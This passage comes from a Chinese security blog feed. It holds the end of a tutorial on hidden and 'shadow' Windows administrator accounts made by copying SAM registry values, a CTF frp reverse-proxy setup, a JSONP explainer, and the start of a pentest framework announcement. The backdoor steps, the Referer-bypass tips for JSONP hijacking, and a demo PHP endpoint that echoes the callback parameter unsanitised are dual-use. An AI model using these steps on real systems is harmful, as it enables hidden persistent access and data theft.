/add</code></pre><p>然后是不是就看不到了？</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2810%29.png" alt="此处输入图片的描述"></p><p>网上的教程讲的真好，果然是这样？真的吗？再好好看看。。。。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2811%29.png" alt="此处输入图片的描述"></p><p>我只能说 wo_ri，图形化真的是无敌啊，admin$ 这种隐藏方式只能经得起命令行的检查，图形化一用就和没有一样，而且不只是登录界面，计算机管理中也看得到：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2812%29.png" alt="此处输入图片的描述"></p><p>所以这种方式的隐藏只是针对管理员用命令查看是否有多余的用户，局限性是很大的。</p><h2 id="0X03-完善：“影子账户”的出现"><a href="#0X03-完善：“影子账户”的出现" class="headerlink" title="0X03 完善：“影子账户”的出现"></a><strong>0X03 完善：“影子账户”的出现</strong></h2><p>网友说，别急，我们还见过一种高级方法，叫做影子账户，好像要改注册表的，据说能和管理员同步，还能让你在计算机管理里面看到的账户虽然是禁用状态，但是还能成功登陆，我同样也做了实验。</p><p>首先需要让Guest账户处于一开始默认的禁用状态，然后打开注册表找到HKEY_LOCAL_MACHINE下面的SAM，可以发现什么都没有，实际上是权限不够，我们需要将当前用户的权限设置为完全控制，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2813%29.png" alt="此处输入图片的描述"></p><p>然后我们就能看到SAM下面的东西了，我们找到administrators账户，看到他对应的十六进制编号是0x1f4，然后找到上面的0x1f4，双击F文件，将其中的16进制内容复制下来，再找到Guest对应的0x1f5，同样打开F文件，复制进去，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2815%29.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2816%29.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2817%29.png" alt="此处输入图片的描述"></p><p>然后我们会惊奇的发现，原本已经被标记为禁用的账户Guest已经变成了非禁用模式，而且我们可以看到图标显示的状态还是Guest处于禁用中，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2821%29.png" alt="此处输入图片的描述"></p><p><strong>注意：</strong><br>1.这里已经默认把Guest放在了管理员组，这一步的工作不再演示<br>2.我们要关注一下Guest的属性中有没有把下图的这一项的勾打上，如果打上了请去掉</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2819%29.png" alt="此处输入图片的描述"></p><p>3.很重要的一步就是还原注册表，因为我们刚刚改变了管理员的权限，我们还要改回去，如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2820%29.png" alt="此处输入图片的描述"></p><p>大功告成，我们看一下效果：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2822%29.png" alt="此处输入图片的描述"></p><p>或许网上的教程都没有注意到这个登录界面？？？即使在计算机管理中看上去是禁用的，但是那个勾不打系统还是认为这个用户活着，登录界面就依然会显示，这启示我们，在真实环境下要做好充分的准备，一边查电脑一边渗透很可能需要一个送饭的…..</p><p>不过这个还是实现了对administrator账户的克隆，也就是说，这个账户和管理员是同步的，你的任何操作都会在管理员登陆的时候看到。</p><h2 id="0X04-升华：真正的隐藏，管理员房间的另一扇门"><a href="#0X04-升华：真正的隐藏，管理员房间的另一扇门" class="headerlink" title="0X04 升华：真正的隐藏，管理员房间的另一扇门"></a><strong>0X04 升华：真正的隐藏，管理员房间的另一扇门</strong></h2><p>在我苦于无法解决这个登录界面的问题时，我又看到了一种方法，彻底解决了我的问题，在这里介绍一下。</p><p>思路是这样的：既然只要我创建账户，只要这个账户活着，系统就会识别这是新的账户，然后在登录界面显示出来，那么唯一的方法就是让这个账户真的不存在，我们可以先拿制作一个影子账户，然后把他的有关登陆的注册表导出来，然后再把这个账户删除，删除以后这个账户就没有其他信息在系统中了，然后我们只把有关登录的注册表导入回去就OK了，就相当于给管理员账户开了另一扇门，仅仅是一扇门，只能用户登录而已，但我们的目的已经达到了。</p><p>和上面重复的步骤我就不再演示：</p><p>我们新建一个admin$账户，完成放进管理组，完成影子账户的建立，然后把对应的注册表项右键导出，如下图：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2824%29.png" alt="此处输入图片的描述"></p><p>两个都要导出，然后我们把用户删除</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2825%29.png" alt="此处输入图片的描述"></p><p>可以看到用户删除以后，注册表已经无法打开</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2826%29.png" alt="此处输入图片的描述"></p><p>双击导出的注册表，并连续点击确定（这里补充一下，如果你在实战中双击以后会出现无法导入的情况，那么其实你可以直接将其用鼠标拖入注册表的对应位置，其实是完全可以的）：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2827%29.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2828%29.png" alt="此处输入图片的描述"></p><p>我们来看一下效果：</p><p>计算机管理里面：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2829%29.png" alt="此处输入图片的描述"></p><p>最关键的登录界面：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2830%29.png" alt="此处输入图片的描述"></p><p>好的，非常稳了！！无比激动</p><p>那我们就放肆的登录吧</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%20%2831%29.png" alt="此处输入图片的描述"></p><h2 id="0X05-致谢"><a href="#0X05-致谢" class="headerlink" title="0X05 致谢"></a><strong>0X05 致谢</strong></h2><p>这种方法我是在一个大师傅的博客里面看到的，安利给大家，一开始不是很懂，后来师傅给我解释的很详细，在此鸣谢。</p><p>文章链接：<br><a href="https://www.k2zone.cn/?p=642">Windows提权建立Administrator的影子账户</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试 windows 后门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF线下赛反向代理配置</title>
    <link href="/2018/06/07/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"/>
    <url>/2018/06/07/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这学期参加了几次线下赛，0CTF Final、铁三等，其中涉及到内网与外网的同时连接以及如何让场外的人也能访问到内网的服务的问题，其他比赛也有人问过我这个问题，我在配置的时候也请教了一些有经验的师傅，看了一些博客，现在也想把这个记录下来，防止忘记。</p><span id="more"></span><h2 id="几种不同的环境情况"><a href="#几种不同的环境情况" class="headerlink" title="几种不同的环境情况"></a>几种不同的环境情况</h2><p>1.比赛本身就提供同时的外网和内网支持（电脑直接可以同时连接）</p><p>2.比赛本身只需要内网，但是 也不屏蔽外网信号， 可以使用比赛场地的wifi或者是使用自己的手机热点</p><p>3.比赛强制使用内网，连手机都不给，甚至屏蔽信号</p><p>第一种情况就是比较舒服的配置也相对简单，第二种就是配置稍微有些复杂，最后一种，我后面再解释。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p><strong>一、第一种情况：</strong></p><p>1.需要的东西：<br>(1) 自己的电脑<br>(2) 自己的有外网ip的vps<br>(3)GitHub 的开源项目 frp<br><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>这种情况就非常简单只要配置好 frp 这个工具就ok了</p><p><strong>配置的方法:</strong></p><p>1.在vps上下载frp 对应的版本<br>比如我是Linux的vps：</p><pre><code class="hljs">frp_0.20.0_linux_386.tar.gz</code></pre><p>2.配置服务端与客户端的链接端口<br>frps.ini</p><pre><code class="hljs">[common]bind_port = 7000</code></pre><p>**注意：**这个配置文件其实有两个，这是简易配置，还有一个比较复杂的，如果有需要可以看readme</p><p>3.打开你服务器上准备映射的端口（以centos为例）</p><p>（1）关闭防火墙：</p><pre><code class="hljs">chkconfig iptables off</code></pre><p>（2）查看目前打开的端口：</p><pre><code class="hljs">/etc/init.d/iptables status</code></pre><p>（3）打开某个（某个范围之间的）端口</p><pre><code class="hljs">iptables -A INPUT -p tcp --dport 8080 -j ACCEPT iptables -A INPUT -p tcp --dport 49152:65534 -j ACCEPT  </code></pre><p>（4）保存并重启防火墙</p><pre><code class="hljs">/etc/rc.d/init.d/iptables save/etc/init.d/iptables restart</code></pre><p>4.vps上运行frps<br>首先cd 到对应的目录<br>然后</p><pre><code class="hljs">./frps -c ./frps.ini</code></pre><p>3.在能访问内部服务器的主机上下载对应的frp<br>比如我是windows:</p><pre><code class="hljs">frp_0.20.0_windows_386.zip</code></pre><p>4.配置好我们客户端的配置文件</p><p>frpc.ini</p><pre><code class="hljs">[common]server_addr = xxx.xxx.xxx.xxx//远程服务器的端口server_port = 7000//远程服务器与主机的连接端口[这里填写的是这个配置的标识，区别其他配置]type = tcplocal_ip = 192.168.201.12//内网的地址local_port = 51321//内网的端口remote_port = 6000//映射到远程服务器的端口（就是之前服务器上）</code></pre><p>5.在主机上运行frpc</p><pre><code class="hljs">./frpc -c ./frpc.ini</code></pre><p>好了，现在外网就能通过你的vps访问你的内网的对应机器了，但是你只要内网有一个ip和端口就需要写一个配置</p><p><strong>二、第二种情况：</strong></p><p>这个时候我们就需要通过配置将第二种情况转化成第一种情况，通过配置路由实现外网内网的同时访问。</p><p>我本地是windows 那我就以windows举例<br>windows 添加路由的方式是使用 route add 指令</p><p>1.首先我们查看一下本地的路由：</p><pre><code class="hljs">route print </code></pre><p>2.添加两条路由<br>命令的规则</p><pre><code class="hljs">route ADD 157.0.0.0 MASK 255.0.0.0 157.55.80.1 （METRIC 3 IF 2）</code></pre><p>意思是：<br>请求 157.0.0.0 网段的请求都由 157.55.80.1 来鲈鱼</p><pre><code class="hljs">route add -p 0.0.0.0 mask 0.0.0.0 外网网关iproute add -p 内网网段 mask 内网掩码 内网网关</code></pre><p>现在就能两个网同时访问了</p><p>3.请回到第一种情况配置 frp</p><p><strong>三、第三种情况：</strong></p><p>大兄弟，醒醒吧，你自己都联不上外网，还想让别人找到你？好好做题吧。。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br><a href="https://www.cnblogs.com/fetty/p/4524029.html">https://www.cnblogs.com/fetty/p/4524029.html</a><br><a href="https://blog.csdn.net/u011846257/article/details/54707864">https://blog.csdn.net/u011846257/article/details/54707864</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘 笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘 反向代理 配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>由浅入深理解JSONP并拓展</title>
    <link href="/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/"/>
    <url>/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a><strong>简单描述</strong></h2><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。<br>JSONP实现跨域请求的原理简单的说，就是动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的src 不受同源策略约束来跨域获取数据。</p><p>JSONP 由两部分组成：<strong>回调函数</strong>和<strong>数据</strong>。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p><p>动态创建<code>&lt;script&gt;</code>标签，设置其src，回调函数在src中设置：</p><pre><code class="hljs">var script = document.createElement(&quot;script&quot;);script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;document.body.insertBefore(script, document.body.firstChild);</code></pre><span id="more"></span><p>在页面中，返回的JSON作为response参数传入回调函数中，我们通过回调函数来来操作数据。</p><pre><code class="hljs">function handleResponse(response)&#123;    // 对response数据进行操作代码&#125;</code></pre><p><strong>上面是简单直接的对JSONP 的描述，可能有些人不是很懂，我们下面一步一步分析</strong></p><h2 id="层层深入"><a href="#层层深入" class="headerlink" title="层层深入"></a><strong>层层深入</strong></h2><p><strong>先通过一个简单的实例简单的理解一下同源策略的作用</strong></p><p>首先我们在本地写入<br><strong>1.html</strong></p><pre><code class="hljs">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;GoJSONP&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function jsonhandle(data)&#123;        alert(&quot;age:&quot; + data.age + &quot;name:&quot; + data.name);    &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    $(document).ready(function()&#123;        $.ajax(&#123;            type : &quot;get&quot;,            url : &quot;http://check.k0rz3n.com/test.php?id=1&quot;,            dataType: &quot;jsonp&quot;,//指定我们的请求是一个 jsonp 的请求            success : function(data) &#123;//success 指定的是默认的回调函数                jsonhandle(data);            &#125;        &#125;);    &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>我服务器上的test.php会返回json 格式的数据给客户端</p><p><strong>test1.php</strong></p><pre><code class="hljs">&lt;?phpheader(&#39;Content-Type:application/json; charset=utf-8&#39;);$data = array(&#39;age&#39;=&gt;19,&#39;name&#39;=&gt;&#39;jianshu&#39;);exit(json_encode($data));?&gt;</code></pre><p>如果正常访问的话，那么我们的浏览器应该会弹出对话框，结果我们会得到这样的结果</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP1.png" alt="此处输入图片的描述"></p><p>可以看到，浏览器发现这是一个跨域的请求，但是他在服务器的返回头中缺没有发现<br>Access-Control-Allow-Origin 值允许 <a href="http://localhost/">http://localhost</a> 的访问，于是就拦截了。</p><p>也就是说，虽然浏览器受到了同源策略的限制，不允许实现跨域访问，但是由于在开发过程中前后端的交互过程中不可避免地会涉及到跨域的请求（设计同源策略的人想必也发现了这个问题），于是设计者给我们留了一个后门，就是只要服务器响应头中返回允许这个源的选项，那么跨域请求就会成功。（这里纠正一个误区，不要认为浏览器默认支持同源策略就意味着不同源的请求就不能发出去，其实还是能发出去的，只是要看响应头而已。）</p><p>我们知道在页面中有几个东西是对同源策略免疫的，那就是 <code>&lt;img&gt;</code> 的src 、<code>&lt;link&gt;</code> 的 href 还有就是<code>&lt;script&gt;</code>的 src , JSONP 就是利用 script 标签的sec 属性实现跨区域请求的</p><p>script标签的请求不论是不是同源一律不受同源策略的限制，那我们就找到了解决跨域访问的方法（似乎这个方法一开始就存在…..）</p><p><strong>我们改变一下代码，本地直接通过script标签请求服务器上的js，js 的内容就是调用参数已经传进去的本地的js函数</strong></p><p><strong>2.html</strong></p><pre><code class="hljs">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;GoJSONP&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function jsonhandle(data)&#123;        alert(&quot;age:&quot; + data.age + &quot;name:&quot; + data.name);    &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://check.k0rz3n.com/remote.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>remote.js</strong></p><pre><code class="hljs">jsonhandle(&#123;    &quot;age&quot; : 15,    &quot;name&quot;: &quot;John&quot;,&#125;)     </code></pre><blockquote><p><strong>注意:</strong></p><p>(1)远程的js 代码不需要script标签<br>(2)这其实也给了我们一些启示，就是我们使用 callback 函数请求的页面实际上类型是javascript 的类型,我们可以在这里看一下浏览器会将哪些类型当做 javascript 解析：<a href="https://mathiasbynens.be/demo/javascript-mime-type">https://mathiasbynens.be/demo/javascript-mime-type</a></p></blockquote><p>下图可以看到我们成功利用<code>&lt;script&gt;</code>实现了跨域的访问。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP2.png" alt="此处输入图片的描述"></p><p>那JSONP和这个有啥关系，感觉已经实现跨域了还没有提到一点JSONP，上面说JSONP是基于script标签的，个人感觉JSONP的优势就是能够实现呢比较方便的函数选择，传一个参数就行了，不用像直接调用那样必须要换js文件。</p><h2 id="真相浮现"><a href="#真相浮现" class="headerlink" title="真相浮现"></a><strong>真相浮现</strong></h2><p><strong>先用下面的代码模拟jsonp的调用过程方便大家更好的理解jsonp的运行过程</strong></p><p><strong>3.html</strong></p><pre><code class="hljs">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;GoJSONP&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;    function jsonhandle(data)&#123;        alert(&quot;age:&quot; + data.age + &quot;name:&quot; + data.name);    &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    $(document).ready(function()&#123;        var url = &quot;http://check.k0rz3n.com/test1.php?id=1&amp;callback=jsonhandle&quot;;        var obj = $(&#39;&lt;script&gt;&lt;\/script&gt;&#39;);        obj.attr(&quot;src&quot;,url);        $(&quot;body&quot;).append(obj);    &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>test1.php</strong></p><pre><code class="hljs">&lt;?php$data = array(    &#39;age&#39; =&gt; 20,    &#39;name&#39; =&gt; &#39;dada&#39;,);$callback = $_GET[&#39;callback&#39;];echo $callback.&quot;(&quot;.json_encode($data).&quot;)&quot;;return;</code></pre><p>我们在scipt标签里面给出的链接是我远程服务器的一个php的代码，我给这个文件传递了一个参数，作为我要调用的函数。服务器接收到这个参数以后把它当做函数名，并给这个函数传递了一个json的值作为用户调用的函数的参数，最终实现调用</p><p>下面是调用成功的截图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP3.png" alt="此处输入图片的描述"></p><p><strong>实际上，jquery 给我们提供了现成的接口，我们可以不用这么麻烦</strong></p><p><strong>4.html</strong></p><pre><code class="hljs">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;GoJSONP&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;function jsonhandle(data)&#123;    alert(&quot;age:&quot; + data.age + &quot;name:&quot; + data.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    $(document).ready(function()&#123;        $.ajax(&#123;            type : &quot;get&quot;,            url : &quot;http://check.k0rz3n.com/test1.php?id=1&quot;,            dataType: &quot;jsonp&quot;,            jsonp:&quot;theFunction&quot;, //指定回调函数在 URL 中的参数名(不指定默认为 callback)            jsonpCallback: &quot;jsonhandle&quot;,//指定回调函数名称(如果不指定，服务器会随机分配一个jQueryxxx 的名字)            success : function(data) &#123;                console.info(&quot;调用success&quot;);            &#125;        &#125;);    &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这时候的请求的 URL 就像下面这个样子：</p><pre><code class="hljs">http://check.k0rz3n.com/test1.php?id=1&amp;theFunction=jsonhandle</code></pre><p>服务器端页面为：</p><p><strong>test2.php</strong></p><pre><code class="hljs">&lt;?php$data = array(    &#39;age&#39; =&gt; 20,    &#39;name&#39; =&gt; &#39;dada&#39;,);$callback = $_GET[&#39;theFunction&#39;];echo $callback.&quot;(&quot;.json_encode($data).&quot;)&quot;;return;</code></pre><p>怎么样，大概理解了吧，其实可以用一个非常形象的例子说明：</p><p><strong>幼稚园吃午饭，小明吧贴有自己名字的碗（回调函数）给了幼稚园阿姨（服务器）,阿姨给小明盛好饭（json参数）以后又把碗还给了小明。</strong></p><p>就是这样的一个过程。</p><h2 id="相关拓展：JSONP攻击"><a href="#相关拓展：JSONP攻击" class="headerlink" title="相关拓展：JSONP攻击"></a><strong>相关拓展：JSONP攻击</strong></h2><h3 id="1-JSONP-跨域劫持"><a href="#1-JSONP-跨域劫持" class="headerlink" title="1.JSONP 跨域劫持"></a>1.JSONP 跨域劫持</h3><p>实际上就是由于服务器端对JSONP 的请求来源的检查不严格导致的</p><p>攻击者模拟用户向有漏洞的服务器发送JSONP请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务器</p><h3 id="2-JSONP-跨域劫持token-实现CSRF"><a href="#2-JSONP-跨域劫持token-实现CSRF" class="headerlink" title="2.JSONP 跨域劫持token 实现CSRF"></a>2.JSONP 跨域劫持token 实现CSRF</h3><p>通过 jsonp 发起请求，得到泄露的 csrf_token  然后，利用这个token 实现CSRF 攻击 </p><h3 id="3-Referer-头的绕过"><a href="#3-Referer-头的绕过" class="headerlink" title="3.Referer 头的绕过"></a>3.Referer 头的绕过</h3><p>在攻击过程中可能会涉及到 referer 头的绕过</p><ol><li>data:URL<br>为了逃避他的检测我们可以选择不发送referer这个头，那么怎么做呢？这就涉及到 data:URL 头</li></ol><p>为了构造一个不带HTTP Referer的请求，我们可以滥用data URI方案。因为我们正在处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码我们的payload（回调函数定义以及脚本包含）<br>data:text&#x2F;plain;base64our_base64_encoded_code:</p><p>以下3个HTML标签允许我们使用data URI方案：</p><pre><code class="hljs">    iframe (在src属性中) – Internet Explorer下不工作    embed (在src属性中) – Internet Explorer及Microsoft Edge下不工作    object (在data属性中) – Internet Explorer及Microsoft Edge下不工作</code></pre><p>2.从HTTPS向HTTP发起请求</p><p>如果目标网站可以通过HTTP访问，也可以通过将我们的代码托管在一个HTTPS页面来避免发送HTTP Referer。如果我们从HTTPS页面发起一个HTTP请求，浏览器为了防止信息泄漏是不会发送Referer header。以上我们要将恶意代码托管在一个启用了HTTPS的站点。<br>注意：由于mixed-content安全机制，在浏览器默认设置下是不会工作的。需要受害者手动允许浏览器发出的安全警告。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h2><p><a href="https://blog.csdn.net/u011897301/article/details/52679486">https://blog.csdn.net/u011897301/article/details/52679486</a><br><a href="https://blog.csdn.net/u014607184/article/details/52027879">https://blog.csdn.net/u014607184/article/details/52027879</a><br><a href="http://www.91ri.org/13407.html">http://www.91ri.org/13407.html</a><br><a href="http://www.freebuf.com/articles/web/70025.html">http://www.freebuf.com/articles/web/70025.html</a><br><a href="http://www.freebuf.com/articles/web/126347.html">http://www.freebuf.com/articles/web/126347.html</a><br><a href="https://www.cnblogs.com/chiangchou/p/jsonp.html">https://www.cnblogs.com/chiangchou/p/jsonp.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘 笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JSONP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AssassinGo:基于Go的可拓展式自动化Web渗透框架</title>
    <link href="/2018/06/03/AssassinGo%E5%8F%AF%E6%8B%93%E5%B1%95%E5%BC%8F%E8%87%AA%E5%8A%A8%E5%8C%96Web%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/"/>
    <url>/2018/06/03/AssassinGo%E5%8F%AF%E6%8B%93%E5%B1%95%E5%BC%8F%E8%87%AA%E5%8A%A8%E5%8C%96Web%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>最近我和我的团队最近完成了一个自动化的渗透测试框架，特地在这个安利一下下，有兴趣的朋友也可以试一试。</p><p>AssassinGo是一款使用Golang开发，集成了高可用情报收集、基础攻击向量探测、Google-Hacking综合搜索和PoC自定义添加并对目标进行批量检测等功能的自动化Web渗透框架，该框架有着基于Vue的WebGUI，前后端交互主要采用WebSocket技术，会将结果实时显示在前台，并且其可扩展性极强，用户实现各模块接口即可添加自定义功能。</p><p>**项目网址：**<a href="https://assassin-go.ink/">https://assassin-go.ink</a></p><p><strong>Github：</strong> <a href="https://github.com/AmyangXYZ/AssassinGo">https://github.com/AmyangXYZ/AssassinGo</a></p><p><img src="https://raw.githubusercontent.com/AmyangXYZ/AssassinGo/master/logo.jpg" alt="此处输入图片的描述"></p><span id="more"></span><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a><strong>功能</strong></h2><h3 id="信息收集部分"><a href="#信息收集部分" class="headerlink" title="信息收集部分"></a><strong>信息收集部分</strong></h3><ol><li><p>HTTP安全头部检查</p></li><li><p>服务器识别 </p></li><li><p>CMS版本识别</p></li><li><p>蜜罐概率检测</p></li><li><p>CloudFlare绕过并检测Real IP</p></li><li><p>路由节点跟踪并在googlemap上做可视化标记</p></li><li><p>端口扫描</p></li><li><p>目录爆破和可视化的sitemap</p></li><li><p>Whois信息</p></li><li><p>子域名扫描</p></li></ol><p>精准的的蜜罐概率检测、并发式的爆破、完美可视化的拓扑以及强大的CloudFlare 绕过并检测真实IP等功能 或许能让使用者在真实的渗透过程中如虎添翼</p><p><strong>下面是部分功能截图：</strong></p><p><strong>（1）基础信息收集：</strong></p><p><img src="https://raw.githubusercontent.com/AmyangXYZ/AssassinGo/master/demo/demo1.png" alt="此处输入图片的描述"></p><p><strong>（2）路由探测并在地图上可视化标记：</strong></p><p><img src="https://raw.githubusercontent.com/AmyangXYZ/AssassinGo/master/demo/demo2.png" alt="此处输入图片的描述"></p><h3 id="基础攻击部分"><a href="#基础攻击部分" class="headerlink" title="基础攻击部分"></a><strong>基础攻击部分</strong></h3><ol><li><p>整站爬虫</p></li><li><p>SQLi检测</p></li><li><p>反射型xss</p></li><li><p>Intruder</p></li><li><p>SSH爆破</p></li></ol><p><strong>以下是部分功能截图：</strong></p><p><strong>Intruder</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GO-Attack.png" alt="此处输入图片的描述"></p><p><strong>下个版本会将爬虫和XSS检测也升级成headless-chrome版本</strong></p><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google-Hacking"></a><strong>Google-Hacking</strong></h3><p>后端调用Headless-Chrome爬取google或bing搜索结果，完全支持google-hacking语法，而且不会被反爬虫检测。这也可以说是一大特色，利用其强大的搜索能力以及详尽的搜索语法和人性化的帮助实现强大的针对性信息收集与自动化提取。</p><p>详细的Google-Hacking语法文档将引用团队成员精心整理的git项目，下面是项目地址：<br><a href="https://github.com/K0rz3n/GoogleHacking-Page">https://github.com/K0rz3n/GoogleHacking-Page</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GO-Seek.png" alt="此处输入图片的描述"></p><h3 id="POC-批量精准探测"><a href="#POC-批量精准探测" class="headerlink" title="POC 批量精准探测"></a><strong>POC 批量精准探测</strong></h3><p>本框架可内置大量的精心选择的最新的POC，并且会显示Poc的详细的信息。我们提供了非常方便的接口供使用者自定义添加POC，使用者可以根据前面功能搜索到的或批量或单一的目标搜索POC进行检测，非常的方便快捷，能够大大提升渗透测试的效率。</p><p><strong>下面是功能截图：</strong></p><p><img src="https://raw.githubusercontent.com/AmyangXYZ/AssassinGo/master/demo/demo3.png" alt="此处输入图片的描述"></p><h3 id="网站服务"><a href="#网站服务" class="headerlink" title="网站服务"></a><strong>网站服务</strong></h3><p>后端基于<a href="https://github.com/AmyangXYZ/sweetygo">sweetygo</a></p><p>前端基于Vue。</p><p>前后端交互大量使用WebSocket，使扫描结果即时展示在前台。</p><h2 id="概要设计"><a href="#概要设计" class="headerlink" title="概要设计"></a><strong>概要设计</strong></h2><p>后端实现选用组合模式。</p><p><img 